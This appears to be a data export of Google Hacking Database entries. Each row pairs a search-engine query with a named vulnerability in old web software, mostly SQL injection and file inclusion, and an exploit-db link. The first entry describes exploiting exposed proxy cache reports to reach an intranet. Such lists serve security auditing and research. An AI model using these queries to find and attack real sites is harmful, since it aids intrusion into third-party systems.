&quot;1&quot;;&quot;2003-06-24&quot;;&quot;"cacheserverreport for" "This analysis was produced by calamaris"&quot;;&quot;These are squid server cache reports. Fairly benign, really except when you consider using them for evil purposes. For example, an institution stands up a proxy server for their internal users to get to the outside world. Then, the internal user surf all over to their hearts content (including intranet pages cuz well, the admins are stupid) Voila, intranet links show up in the external cache report. Want to make matters worse for yourself as an admin? OK, configure your external proxy server as a trusted internal host. Load up your web browser, set your proxy as their proxy and surf your way into their intranet. Not that I&#039;ve noticed any examples of this in this google list. *COUGH* *COUGH* *COUGH*  unresolved DNS lookups give clues *COUGH* *COUGH* (&#039;scuse me. must be a furball) OK, lets say BEST CASE scenario. Let&#039;s say there&#039;s not security problems revealed in these logs. Best case scenario is that outsiders can see what your company/agency/workers are surfing.&quot;
&quot;2018&quot;;&quot;2010-11-15&quot;;&quot;"Search Affiliate Programs:"&quot;;&quot;Affiliate Directory (cat_id) Remote SQL Injection Vulnerbility: http://www.exploit-db.com/exploits/5363&quot;
&quot;2019&quot;;&quot;2010-11-15&quot;;&quot;intitle:"Dacio&#039;s Image Gallery"&quot;;&quot;Dacio&#039;s Image Gallery 1.6 (DT/Bypass/SU) Remote Vulnerabilities: http://www.exploit-db.com/exploits/8653&quot;
&quot;2020&quot;;&quot;2010-11-15&quot;;&quot;"Website by Spokane Web Communications"  &quot;;&quot;ArticleLive (Interspire Website Publisher) SQL Injection Vulnerability: http://www.exploit-db.com/exploits/12526&quot;
&quot;2022&quot;;&quot;2010-11-15&quot;;&quot;"powered by: elkagroup" &quot;;&quot;elkagroup SQL Injection Vulnerability - CVE: 2009-4569: http://www.exploit-db.com/exploits/10330&quot;
&quot;2023&quot;;&quot;2010-11-15&quot;;&quot;allinurl:/myspeach/&quot;;&quot;MySpeach 3.0.2 (my_ms[root]) Remote File Include Vulnerability - CVE: 2006-4630: http://www.exploit-db.com/exploits/2301&quot;
&quot;2024&quot;;&quot;2010-11-15&quot;;&quot;Powered by Revsense&quot;;&quot;RevSense (Auth bypass) Remote SQL Injection Vulnerability - CVE: 2008-6309: http://www.exploit-db.com/exploits/7163&quot;
&quot;2025&quot;;&quot;2010-11-15&quot;;&quot;724CMS Powered, 724CMS Version 4.59. Enterprise &quot;;&quot;724CMS Enterprise Version 4.59 SQL Injection Vulnerability - CVE: 2008-1858: http://www.exploit-db.com/exploits/12560&quot;
&quot;2026&quot;;&quot;2010-11-15&quot;;&quot;index.php?option=com_facileforms&quot;;&quot;Joomla Component com_facileforms 1.4.4 RFI Vulnerability - CVE: 2008-2990: http://www.exploit-db.com/exploits/5915&quot;
&quot;2027&quot;;&quot;2010-11-15&quot;;&quot;Powered By phUploader &quot;;&quot;phUploader Remote File Upload Vulnerability - CVE: 2007-4527: http://www.exploit-db.com/exploits/10574&quot;
&quot;2028&quot;;&quot;2010-11-15&quot;;&quot;inurl:"myLDlinker.php" &quot;;&quot;WordPress Plugin myLDlinker SQL Injection Vulnerability - CVE: 2010-2924: http://www.exploit-db.com/exploits/14441&quot;
&quot;2029&quot;;&quot;2010-11-15&quot;;&quot;inurl:com_idoblog&quot;;&quot;Joomla Component iDoBlog b24 Remote SQL Injection Vulnerability - CVE: 2008-2627: http://www.exploit-db.com/exploits/5730&quot;
&quot;2030&quot;;&quot;2010-11-15&quot;;&quot;/modules/xhresim/&quot;;&quot;XOOPS Module xhresim (index.php no) Remote SQL Injection Vuln - CVE: 2008-5665: http://www.exploit-db.com/exploits/6748&quot;
&quot;2032&quot;;&quot;2010-11-15&quot;;&quot;Maian Events v2.0 Copyright Ã‚Â© 2005-2008 Maian Script World. All Rights Reserved&quot;;&quot;Maian Events 2.0 Insecure Cookie Handling Vulnerability: http://www.exploit-db.com/exploits/6048&quot;
&quot;2033&quot;;&quot;2010-11-15&quot;;&quot;"Powered by FubarForum v1.5"&quot;;&quot;FubarForum 1.5 (index.php page) Local File Inclusion Vulnerability - CVE: 2008-2887: http://www.exploit-db.com/exploits/5872&quot;
&quot;2034&quot;;&quot;2010-11-15&quot;;&quot;/modules/amevents/print.php?id=&quot;;&quot;XOOPS Module Amevents (print.php id) SQL Injection Vulnerability - CVE: 2008-5768: http://www.exploit-db.com/exploits/7479&quot;
&quot;2036&quot;;&quot;2010-11-15&quot;;&quot;allinurl: com_gallery "func"&quot;;&quot;Mambo Component com_gallery Remote SQL Injection Vulnerability - CVE: 2008-0746: http://www.exploit-db.com/exploits/5084&quot;
&quot;2037&quot;;&quot;2010-11-15&quot;;&quot;"pForum 1.29a"  OR ""Powie&#039;s PSCRIPT Forum 1.26"&quot;;&quot;Powies pForum 1.29a (editpoll.php) SQL Injection Vulnerability - CVE: 2006-6038: http://www.exploit-db.com/exploits/2797&quot;
&quot;2038&quot;;&quot;2010-11-15&quot;;&quot;allinurl: "/modules/myTopics/"&quot;;&quot;XOOPS Module myTopics (articleid) Remote SQL Injection Vulnerability - CVE: 2008-0847: http://www.exploit-db.com/exploits/5148&quot;
&quot;2040&quot;;&quot;2010-11-15&quot;;&quot;allinurl:"index.php?site=" "W-Agora"&quot;;&quot;w-Agora 4.2.1 (cat) Remote SQL Injection Vulnerability - CVE: 2007-6647: http://www.exploit-db.com/exploits/4817&quot;
&quot;2041&quot;;&quot;2010-11-15&quot;;&quot;inurl:categoria.php?ID= comune &quot;;&quot;Prometeo v1.0.65 SQL Injection Vulnerability: http://www.exploit-db.com/exploits/14806&quot;
&quot;2043&quot;;&quot;2010-11-15&quot;;&quot;inurl:"index.php?m_id=" &quot;;&quot;slogan design Script SQL Injection Vulnerability: http://www.exploit-db.com/exploits/12849&quot;
&quot;2044&quot;;&quot;2010-11-15&quot;;&quot;Powered by MVC-Web CMS  inurl:/index.asp?newsid=&quot;;&quot;MVC-Web CMS 1.0/1.2 (index.asp newsid) SQL Injection Vulnerability: http://www.exploit-db.com/exploits/5912&quot;
&quot;2045&quot;;&quot;2010-11-15&quot;;&quot;allinurl: "showCat.php?cat_id"&quot;;&quot;D.E. Classifieds (cat_id) Remote SQL Injection Vulnerability: http://www.exploit-db.com/exploits/5291&quot;
&quot;2046&quot;;&quot;2010-11-15&quot;;&quot;"Web site engine&#039;s code is copyright Ã‚Â© 2001-2007 ATutorÃ‚Â®"&quot;;&quot;ATutor 1.6.1-pl1 (import.php) Remote File Inclusion Vulnerability - CVE: 2008-3368: http://www.exploit-db.com/exploits/6153&quot;
&quot;2047&quot;;&quot;2010-11-15&quot;;&quot;"PhpLinkExchange v1.02" &quot;;&quot;PhpLinkExchange v1.02 - XSS/Upload Vulerability - CVE: 2008-3679: http://www.exploit-db.com/exploits/10495&quot;
&quot;2048&quot;;&quot;2010-11-15&quot;;&quot;"ClanSys v.1.1"&quot;;&quot;Clansys v.1.1 (index.php page) PHP Code Insertion Vulnerability - CVE: 2006-2005: http://www.exploit-db.com/exploits/1710&quot;
&quot;2049&quot;;&quot;2010-11-15&quot;;&quot;inurl:inc_accountlistmanager.asp&quot;;&quot;DMXReady Account List Manager 1.1 Contents Change Vulnerability: http://www.exploit-db.com/exploits/7754&quot;
&quot;2050&quot;;&quot;2010-11-15&quot;;&quot;inurl:com_jomestate &quot;;&quot;Joomla Hot Property com_jomestate RFI Vulnerability: http://www.exploit-db.com/exploits/13956&quot;
&quot;2051&quot;;&quot;2010-11-15&quot;;&quot;CrÃƒÂ©ÃƒÂ© par Narfight, ClanLite V2.2006.05.20 Ã‚Â© 2000-2005&quot;;&quot;ClanLite 2.x (SQL Injection/XSS) Multiple Remote Vulnerabilities - CVE: 2008-5215: http://www.exploit-db.com/exploits/5595&quot;
&quot;2052&quot;;&quot;2010-11-15&quot;;&quot;"Members Statistics" +"Total Members" +"Guests Online"&quot;;&quot;AR Memberscript (usercp_menu.php) Remote File Include Vulnerability - CVE: 2006-6590: http://www.exploit-db.com/exploits/2931&quot;
&quot;2053&quot;;&quot;2010-11-15&quot;;&quot;"Copyright Interactivefx.ie" &quot;;&quot;Interactivefx.ie CMS SQL Injection Vulnerability: http://www.exploit-db.com/exploits/11873&quot;
&quot;2054&quot;;&quot;2010-11-15&quot;;&quot;"Powered by Atomic Photo Album" inurl:"photo.php?apa_album_ID="&quot;;&quot;Atomic Photo Album 1.0.2 Multiple Vulnerabilities: http://www.exploit-db.com/exploits/14801&quot;
&quot;2055&quot;;&quot;2010-11-15&quot;;&quot;inurl:tr.php?id= Hosting&quot;;&quot;YourFreeWorld Classifieds Hosting (id) SQL Injection Vulnerability - CVE: 2008-4884: http://www.exploit-db.com/exploits/6948&quot;
&quot;2056&quot;;&quot;2010-11-15&quot;;&quot;allinur:com_extended_registration&quot;;&quot;Mambo com_registration_detailed 4.1 Remote File Include - CVE: 2006-5254: http://www.exploit-db.com/exploits/2379&quot;
&quot;2057&quot;;&quot;2010-11-15&quot;;&quot;"100% | 50% | 25%" "Back to gallery" inurl:"show.php?imageid="&quot;;&quot;Easy Photo Gallery 2.1 Arbitrary Add Admin / remove user Vulnerability - CVE: 2008-4167: http://www.exploit-db.com/exploits/6437&quot;
&quot;2058&quot;;&quot;2010-11-15&quot;;&quot;inurl:com_rapidrecipe "recipe_id"&quot;;&quot;Joomla Component rapidrecipe Remote SQL injection Vulnerability - CVE: 2008-2697: http://www.exploit-db.com/exploits/5759&quot;
&quot;2059&quot;;&quot;2010-11-15&quot;;&quot;"Powered by SoftbizScripts" "OUR SPONSORS"&quot;;&quot;Softbiz Link Directory Script Remote SQL Injection Vulnerability - CVE: 2007-5996: http://www.exploit-db.com/exploits/4620&quot;
&quot;2060&quot;;&quot;2010-11-15&quot;;&quot;Powered by PowerPortal v1.3a&quot;;&quot;PowerPortal 1.3a (index.php) Remote File Include Vulnerability - CVE: 2006-5126: http://www.exploit-db.com/exploits/2454&quot;
&quot;2061&quot;;&quot;2010-11-15&quot;;&quot;Powered by DUdforum 3.0     inurl:/forums.asp?iFor=&quot;;&quot;DUdForum 3.0 (forum.asp iFor) Remote SQL Injection Vulnerability: http://www.exploit-db.com/exploits/5894&quot;
&quot;2062&quot;;&quot;2010-11-15&quot;;&quot;"powered by kure"&quot;;&quot;Kure 0.6.3 (index.php post,doc) Local File Inclusion Vulnerability - CVE: 2008-4632: http://www.exploit-db.com/exploits/6767&quot;
&quot;2065&quot;;&quot;2010-11-15&quot;;&quot;"Liberum Help Desk, Copyright (C) 2001 Doug Luxem"&quot;;&quot;Liberum Help Desk 0.97.3 (SQL/DD) Remote Vulnerabilities - CVE: 2008-6057: http://www.exploit-db.com/exploits/7493&quot;
&quot;2066&quot;;&quot;2010-11-15&quot;;&quot;inurl:modules.php?name=Shopping_Cart &quot;;&quot;PHP-Nuke Module Emporium 2.3.0 (id_catg) SQL Injection Vulnerability - CVE: 2007-1034: http://www.exploit-db.com/exploits/10615&quot;
&quot;2067&quot;;&quot;2010-11-15&quot;;&quot;allinurl: galid "index.php?p=gallerypic"&quot;;&quot;Koobi Pro 6.25 gallery Remote SQL Injection Vulnerability: http://www.exploit-db.com/exploits/5413&quot;
&quot;2068&quot;;&quot;2010-11-15&quot;;&quot;intext:"powered by itaco group"&quot;;&quot;ITaco Group ITaco.biz (view_news) SQL Injection Vulnerability: http://www.exploit-db.com/exploits/11012&quot;
&quot;2069&quot;;&quot;2010-11-15&quot;;&quot;"Powered by yappa-ng 2.3.1" AND "Powered by yappa-ng 2.3.1"&quot;;&quot;yappa-ng 2.3.1 (admin_modules) Remote File Include Vulnerability: http://www.exploit-db.com/exploits/2292&quot;
&quot;2070&quot;;&quot;2010-11-15&quot;;&quot;mediaHolder.php?id&quot;;&quot;WordPress Media Holder (mediaHolder.php id) SQL Injection Vuln: http://www.exploit-db.com/exploits/6842&quot;
&quot;2071&quot;;&quot;2010-11-15&quot;;&quot;"ActualAnalyzer Lite (free) 2.78"+"Copyright Ã‚Â© 2006 ActualScripts" &quot;;&quot;ActualAnalyzer Lite (free) 2.78 Local File Inclusion Vulnerability - CVE: 2008-2076: http://www.exploit-db.com/exploits/5528&quot;
&quot;2072&quot;;&quot;2010-11-15&quot;;&quot;"powered by seditio" OR "powered by ldu"&quot;;&quot;Seditio CMS v121 (pfs.php) Remote File Upload Vulnerability - CVE: 2007-4057: http://www.exploit-db.com/exploits/4235&quot;
&quot;2073&quot;;&quot;2010-11-15&quot;;&quot;inurl:com_forum&quot;;&quot;com_forum Mambo Component &quot;
&quot;2074&quot;;&quot;2010-11-15&quot;;&quot;Powered By AJ Auction&quot;;&quot;AJ Auction v1 (id) Remote SQL Injection Vulnerability: http://www.exploit-db.com/exploits/5868&quot;
&quot;2075&quot;;&quot;2010-11-15&quot;;&quot;"Powered by Content Injector v1.52"&quot;;&quot;Content Injector 1.52 (index.php cat) Remote SQL Injection Vulnerability - CVE: 2007-6137: http://www.exploit-db.com/exploits/4645&quot;
&quot;2077&quot;;&quot;2010-11-15&quot;;&quot;Events Calendar 1.1&quot;;&quot;Events Calendar 1.1 Remote File Inclusion Vulnerability - CVE: 2008-4673: http://www.exploit-db.com/exploits/6623&quot;
&quot;2078&quot;;&quot;2010-11-15&quot;;&quot;"Copyright (c) 2004-2006 by Simple PHP Guestbook" &quot;;&quot;Simple PHP Guestbook Remote Admin Access: http://www.exploit-db.com/exploits/10666&quot;
&quot;2079&quot;;&quot;2010-11-15&quot;;&quot;inurl:inc_linksmanager.asp&quot;;&quot;DMXReady Links Manager 1.1 Remote Contents Change Vulnerability: http://www.exploit-db.com/exploits/7772&quot;
&quot;2080&quot;;&quot;2010-11-15&quot;;&quot;inurl:/index.php?option=com_otzivi &quot;;&quot;Joomla Component com_otzivi Blind SQL Injection Vulnerability: http://www.exploit-db.com/exploits/10966&quot;
&quot;2082&quot;;&quot;2010-11-15&quot;;&quot;"Powered by DigitalHive"&quot;;&quot;DigitalHive 2.0 RC2 (base_include.php) Remote Include Vulnerability - CVE: 2006-5493: http://www.exploit-db.com/exploits/2566&quot;
&quot;2083&quot;;&quot;2010-11-15&quot;;&quot;inurl:"com_casino_blackjack"&quot;;&quot;Joomla Casino 0.3.1 Multiple SQL Injection - CVE: 2009-2239: http://www.exploit-db.com/exploits/8743&quot;
&quot;2084&quot;;&quot;2010-11-15&quot;;&quot;inurl:"/tagit2b/"&quot;;&quot;TagIt! Tagboard 2.1.b b2 (index.php) Remote File Include Vulnerability - CVE: 2006-5093: http://www.exploit-db.com/exploits/2450&quot;
&quot;2085&quot;;&quot;2010-11-15&quot;;&quot;"powered by LionWiki " &quot;;&quot;LionWiki 3.X (index.php) Shell Upload Vulnerability: http://www.exploit-db.com/exploits/12075&quot;
&quot;2086&quot;;&quot;2010-11-15&quot;;&quot;allinurl: "index.php?area"galid&quot;;&quot;Koobi Pro 6.25 showimages Remote SQL Injection Vulnerability: http://www.exploit-db.com/exploits/5414&quot;
&quot;2087&quot;;&quot;2010-11-15&quot;;&quot;inurl:"tr1.php?id="&quot;;&quot;YourFreeWorld Scrolling Text Ads (id) SQL Injection Vulnerability - CVE: 2008-4885: http://www.exploit-db.com/exploits/6942&quot;
&quot;2088&quot;;&quot;2010-11-15&quot;;&quot;"Designed by Spaceacre" &quot;;&quot;Spaceacre Multiple SQL Injection Vulnerability: http://www.exploit-db.com/exploits/12551&quot;
&quot;2089&quot;;&quot;2010-11-15&quot;;&quot;Powered by Shadowed Portal&quot;;&quot;Shadowed Portal 5.7d3 (POST) Remote File Inclusion Vulnerability: http://www.exploit-db.com/exploits/4769&quot;
&quot;2090&quot;;&quot;2010-11-15&quot;;&quot;"Powered by: PhotoPost PHP 4.6.5" &quot;;&quot;PhotoPost PHP 4.6.5 (ecard.php) SQL Injection Vulnerability - CVE: 2004-0239: http://www.exploit-db.com/exploits/14453&quot;
&quot;2091&quot;;&quot;2010-11-15&quot;;&quot;inurl:"com_otzivi" &quot;;&quot;Joomla Component com_otzivi Local File Inclusion Vulnerability: http://www.exploit-db.com/exploits/11494&quot;
&quot;2092&quot;;&quot;2010-11-15&quot;;&quot;inurl:"browse.php?folder=" Powered by GeneShop 5&quot;;&quot;GeneShop 5.1.1 SQL Injection Vunerability: http://www.exploit-db.com/exploits/12442&quot;
&quot;2093&quot;;&quot;2010-11-15&quot;;&quot;"Powered by PsNews"   &quot;;&quot;PsNews 1.1 (show.php newspath) Local File Inclusion Vulnerability - CVE: 2007-3772: http://www.exploit-db.com/exploits/4174&quot;
&quot;2094&quot;;&quot;2010-11-15&quot;;&quot;inurl:inc_faqsmanager.asp&quot;;&quot;DMXReady Faqs Manager 1.1 Remote Contents Change Vulnerability: http://www.exploit-db.com/exploits/7770&quot;
&quot;2095&quot;;&quot;2010-11-15&quot;;&quot;"powered by sX-Shop" &quot;;&quot;sX-Shop Multiple SQL Injection Vulnerabilities: http://www.exploit-db.com/exploits/14558&quot;
&quot;2096&quot;;&quot;2010-11-15&quot;;&quot;intext:&#039;Powered by ProArcadeScript &#039; inurl:&#039;game.php?id=&#039; &quot;;&quot;ProArcadeScript to Game (game) SQL Injection Vulnerability - CVE: 2010-1069: http://www.exploit-db.com/exploits/11080&quot;
&quot;2097&quot;;&quot;2010-11-15&quot;;&quot;inurl:tr.php?id= Downline&quot;;&quot;YourFreeWorld Downline Builder (id) Remote SQL Injection Vulnerability - CVE: 2008-4895: http://www.exploit-db.com/exploits/6935&quot;
&quot;2098&quot;;&quot;2010-11-15&quot;;&quot;inurl:tr.php?id= Autoresponder&quot;;&quot;YourFreeWorld Autoresponder Hosting (id) SQL Injection Vulnerability - CVE: 2008-4882: http://www.exploit-db.com/exploits/6938&quot;
&quot;2099&quot;;&quot;2010-11-15&quot;;&quot;inurl:"/index.php?m=" "PHPRecipeBook 2.39"&quot;;&quot;PHPRecipeBook 2.39 (course_id) Remote SQL Injection Vulnerability - CVE: 2009-4883: http://www.exploit-db.com/exploits/8330&quot;
&quot;2100&quot;;&quot;2010-11-15&quot;;&quot;"powered by webClassifieds"&quot;;&quot;webClassifieds 2005 (Auth Bypass) SQL Injection Vulnerability - CVE: 2008-5817: http://www.exploit-db.com/exploits/7602&quot;
&quot;2101&quot;;&quot;2010-11-15&quot;;&quot;inurl:/modules/Partenaires/clic.php?id= &quot;;&quot;Nuked-Klan Module Partenaires NK 1.5 Blind Sql Injection: http://www.exploit-db.com/exploits/14556&quot;
&quot;2102&quot;;&quot;2010-11-15&quot;;&quot;"Powered by SoftbizScripts" "ALL JOBS"&quot;;&quot;Softbiz Jobs & Recruitment Remote SQL Injection Vulnerability - CVE: 2007-5316: http://www.exploit-db.com/exploits/4504&quot;
&quot;2103&quot;;&quot;2010-11-15&quot;;&quot;inurl:com_jabode&quot;;&quot;Joomla Component jabode (id) Remote SQL Injection Vulnerability - CVE: 2008-7169: http://www.exploit-db.com/exploits/5963&quot;
&quot;2104&quot;;&quot;2010-11-15&quot;;&quot;"powered by DBHcms" &quot;;&quot;DBHcms 1.1.4 Stored XSS: http://www.exploit-db.com/exploits/12499&quot;
&quot;2108&quot;;&quot;2010-11-15&quot;;&quot;intext:"sitio web diseÃ±ado por www.toronja.com.pe" &quot;;&quot;Toronja Cms HTML/XSS Injection Vulnerability: http://www.exploit-db.com/exploits/12771&quot;
&quot;2109&quot;;&quot;2010-11-15&quot;;&quot;"Powered by CMScout Ã‚Â©2005 CMScout Group"&quot;;&quot;CMScout 2.05 (common.php bit) Local File Inclusion Vulnerability - CVE: 2008-3415: http://www.exploit-db.com/exploits/6142&quot;
&quot;2111&quot;;&quot;2010-11-15&quot;;&quot;inurl:test.php Powered by TalkBack&quot;;&quot;TalkBack 2.3.14 Multiple Remote Vulnerabilities - CVE: 2009-4854: http://www.exploit-db.com/exploits/9095&quot;
&quot;2112&quot;;&quot;2010-11-15&quot;;&quot;Maian Gallery v2.0 Copyright Ã‚Â© 2006-2008 Maian Script World. All Rights Reserved.&quot;;&quot;Maian Gallery 2.0 Insecure Cookie Handling Vulnerability: http://www.exploit-db.com/exploits/6049&quot;
&quot;2114&quot;;&quot;2010-11-15&quot;;&quot;"Powered by Ovidentia"&quot;;&quot;Ovidentia 6.6.5 (item) Remote SQL Injection Vulnerability - CVE: 2008-3918: http://www.exploit-db.com/exploits/6232&quot;
&quot;2115&quot;;&quot;2010-11-15&quot;;&quot;team5 studio all rights reserved site:cn&quot;;&quot;Team 1.x (DD/XSS) Multiple Remote Vulnerabilities - CVE: 2009-0760: http://www.exploit-db.com/exploits/7982&quot;
&quot;2116&quot;;&quot;2010-11-15&quot;;&quot;allintext:" If you would like to contact us, our email address is" traffic&quot;;&quot;Traffic Stats (referralUrl.php offset) Remote SQL Injection Vulnerbility - CVE: 2007-3840: http://www.exploit-db.com/exploits/4187&quot;
&quot;2117&quot;;&quot;2010-11-15&quot;;&quot;"powered by phpGreetCards"&quot;;&quot;phpGreetCards XSS/Arbitrary File Upload Vulnerability - CVE: 2008-6848: http://www.exploit-db.com/exploits/7561&quot;
&quot;2118&quot;;&quot;2010-11-15&quot;;&quot;powered by apt-webservice ;apt-webshop-system v3.0 &quot;;&quot;APT-WEBSHOP-SYSTEM modules.php SQL Injection Vulnerability: http://www.exploit-db.com/exploits/14528&quot;
&quot;2121&quot;;&quot;2010-11-15&quot;;&quot;Maian Music v1.0. Copyright Ã‚Â© 2007-2008 Maian Script World. All Rights Reserved.&quot;;&quot;Maian Music 1.0 Insecure Cookie Handling Vulnerability: http://www.exploit-db.com/exploits/6051&quot;
&quot;2123&quot;;&quot;2010-11-15&quot;;&quot;inurl:/wp-content/plugins/wpSS/&quot;;&quot;Wordpress Plugin Spreadsheet 0.6 SQL Injection Vulnerability - CVE: 2008-1982: http://www.exploit-db.com/exploits/5486&quot;
&quot;2125&quot;;&quot;2010-11-15&quot;;&quot;"Powerd by www.e-webtech.com" &quot;;&quot;e-webtech (new.asp?id=) SQL Injection Vulnerability: http://www.exploit-db.com/exploits/12547&quot;
&quot;2126&quot;;&quot;2010-11-15&quot;;&quot;inurl:inc_billboardmanager.asp?ItemID=&quot;;&quot;DMXReady Billboard Manager 1.1 Remote File Upload Vulnerability: http://www.exploit-db.com/exploits/7791&quot;
&quot;2127&quot;;&quot;2010-11-15&quot;;&quot;allinurl :"modules/recipe"&quot;;&quot;XOOPS Module Recipe (detail.php id) SQL Injection Vulnerability: http://www.exploit-db.com/exploits/5473&quot;
&quot;2129&quot;;&quot;2010-11-15&quot;;&quot;"powered by php advanced transfer manager"&quot;;&quot;phpAtm 1.30 (downloadfile) Remote File Disclosure Vulnerability - CVE: 2007-2659: http://www.exploit-db.com/exploits/3918&quot;
&quot;2130&quot;;&quot;2010-11-15&quot;;&quot;"Powered by GeN4"&quot;;&quot;PTCPay GEN4 (buyupg.php) SQL Injection Vulnerability: http://www.exploit-db.com/exploits/14086&quot;
&quot;2131&quot;;&quot;2010-11-15&quot;;&quot;"Powered By Gravity Board X v2.0 BETA"&quot;;&quot;Gravity Board X 2.0b SQL Injection / Post Auth Code Execution - CVE: 2008-2996: http://www.exploit-db.com/exploits/8350&quot;
&quot;2132&quot;;&quot;2010-11-15&quot;;&quot;inurl:com_flippingbook&quot;;&quot;Joomla Component FlippingBook 1.0.4 SQL Injection Vulnerability - CVE: 2008-2095: http://www.exploit-db.com/exploits/5484&quot;
&quot;2133&quot;;&quot;2010-11-15&quot;;&quot;"Help desk software by United Web Coders rev. 3.0.640" &quot;;&quot;Trouble Ticket Software ttx.cgi Remote File Download: http://www.exploit-db.com/exploits/11823&quot;
&quot;2135&quot;;&quot;2010-11-15&quot;;&quot;"Powered by  vlBook 1.21"&quot;;&quot;vlBook 1.21 (XSS/LFI) Multiple Remote Vulnerabilities - CVE: 2008-2073: http://www.exploit-db.com/exploits/5529&quot;
&quot;2136&quot;;&quot;2010-11-15&quot;;&quot;Copyright Ã‚Â©  Rotator 2008&quot;;&quot;YourFreeWorld URL Rotator (id) Remote SQL Injection Vulnerability: http://www.exploit-db.com/exploits/6949&quot;
&quot;2137&quot;;&quot;2010-11-15&quot;;&quot;inurl:tr.php?id= Reminder Service&quot;;&quot;YourFreeWorld Reminder Service (id) SQL Injection Vulnerability - CVE: 2008-4881: http://www.exploit-db.com/exploits/6943&quot;
&quot;2138&quot;;&quot;2010-11-15&quot;;&quot;"Jevonweb Guestbook"&quot;;&quot;Jevonweb Guestbook Remote Admin Access: http://www.exploit-db.com/exploits/10665&quot;
&quot;2139&quot;;&quot;2010-11-15&quot;;&quot;inurl:inc_contactusmanager.asp&quot;;&quot;DMXReady Contact Us Manager 1.1 Remote Contents Change Vuln: http://www.exploit-db.com/exploits/7768&quot;
&quot;2140&quot;;&quot;2010-11-15&quot;;&quot;inurl:com_neorecruit &quot;;&quot;Joomla Component com_neorecruit 1.4 SQL Injection Vulnerability: http://www.exploit-db.com/exploits/14570&quot;
&quot;2141&quot;;&quot;2010-11-15&quot;;&quot;"index.php?option=com_mdigg"&quot;;&quot;Joomla Component com_mdigg SQL Injection Vulnerability: http://www.exploit-db.com/exploits/10847&quot;
&quot;2143&quot;;&quot;2010-11-15&quot;;&quot;"Software PBLang 4.66z" AND "Software PBLang 4.60" OR "Software PBLang"&quot;;&quot;PBLang 4.66z (temppath) Remote File Include Vulnerability - CVE: 2006-5062: http://www.exploit-db.com/exploits/2428&quot;
&quot;2144&quot;;&quot;2010-11-15&quot;;&quot;&#039;SEO by NuSEO.PHP&#039;&quot;;&quot;NuSEO PHP Enterprise 1.6 Remote File Inclusion Vulnerability - CVE: 2007-5409: http://www.exploit-db.com/exploits/4512&quot;
&quot;2145&quot;;&quot;2010-11-15&quot;;&quot;intext:"Web design by goffgrafix.com" &quot;;&quot;goffgrafix Design&#039;s SQL Injection Vulnerability: http://www.exploit-db.com/exploits/12712&quot;
&quot;2146&quot;;&quot;2010-11-15&quot;;&quot;powered by zeeways &quot;;&quot;Zeeways Technology (product_desc.php) SQL Injection Vulnerability: http://www.exploit-db.com/exploits/11047&quot;
&quot;2147&quot;;&quot;2010-11-15&quot;;&quot;"Welcome to Exponent CMS" | "my new exponent site"  inurl:articlemodule &quot;;&quot;Exponent CMS 0.96.3 (articlemodule) Sql Injection Vulnerability: http://www.exploit-db.com/exploits/11349&quot;
&quot;2148&quot;;&quot;2010-11-15&quot;;&quot;intitle:"Shorty (Beta)"&quot;;&quot;Shorty 0.7.1b (Auth Bypass) Insecure Cookie Handling Vulnerability: http://www.exploit-db.com/exploits/9419&quot;
&quot;2150&quot;;&quot;2010-11-15&quot;;&quot;inurl:index.php?mod=ConcoursPhoto&quot;;&quot;KwsPHP Module ConcoursPhoto (C_ID) SQL Injection Vulnerability - CVE: 2008-1758: http://www.exploit-db.com/exploits/5353&quot;
&quot;2151&quot;;&quot;2010-11-15&quot;;&quot;"Copyright MaxiSepet Â©" &quot;;&quot;MaxiSepet 1.0 (link) SQL Injection Vulnerability: http://www.exploit-db.com/exploits/1900&quot;
&quot;2152&quot;;&quot;2010-11-15&quot;;&quot;Powered by sabros.us&quot;;&quot;sabros.us 1.75 (thumbnails.php) Remote File Disclosure Vulnerability - CVE: 2008-1799: http://www.exploit-db.com/exploits/5360&quot;
&quot;2154&quot;;&quot;2010-11-15&quot;;&quot;inurl:inc_registrationmanager.asp&quot;;&quot;DMXReady Registration Manager 1.1 Contents Change Vulnerability: http://www.exploit-db.com/exploits/7784&quot;
&quot;2155&quot;;&quot;2010-11-15&quot;;&quot;"Powered by Drumbeat" inurl:index02.php &quot;;&quot;Drumbeat CMS SQL Injection: http://www.exploit-db.com/exploits/10575&quot;
&quot;2156&quot;;&quot;2010-11-15&quot;;&quot;"Designed & Developed by N.E.T E-Commerce Group. All Rights Reserved."&quot;;&quot;IranMC Arad Center (news.php id) SQL Injection Vulnerability: http://www.exploit-db.com/exploits/6712&quot;
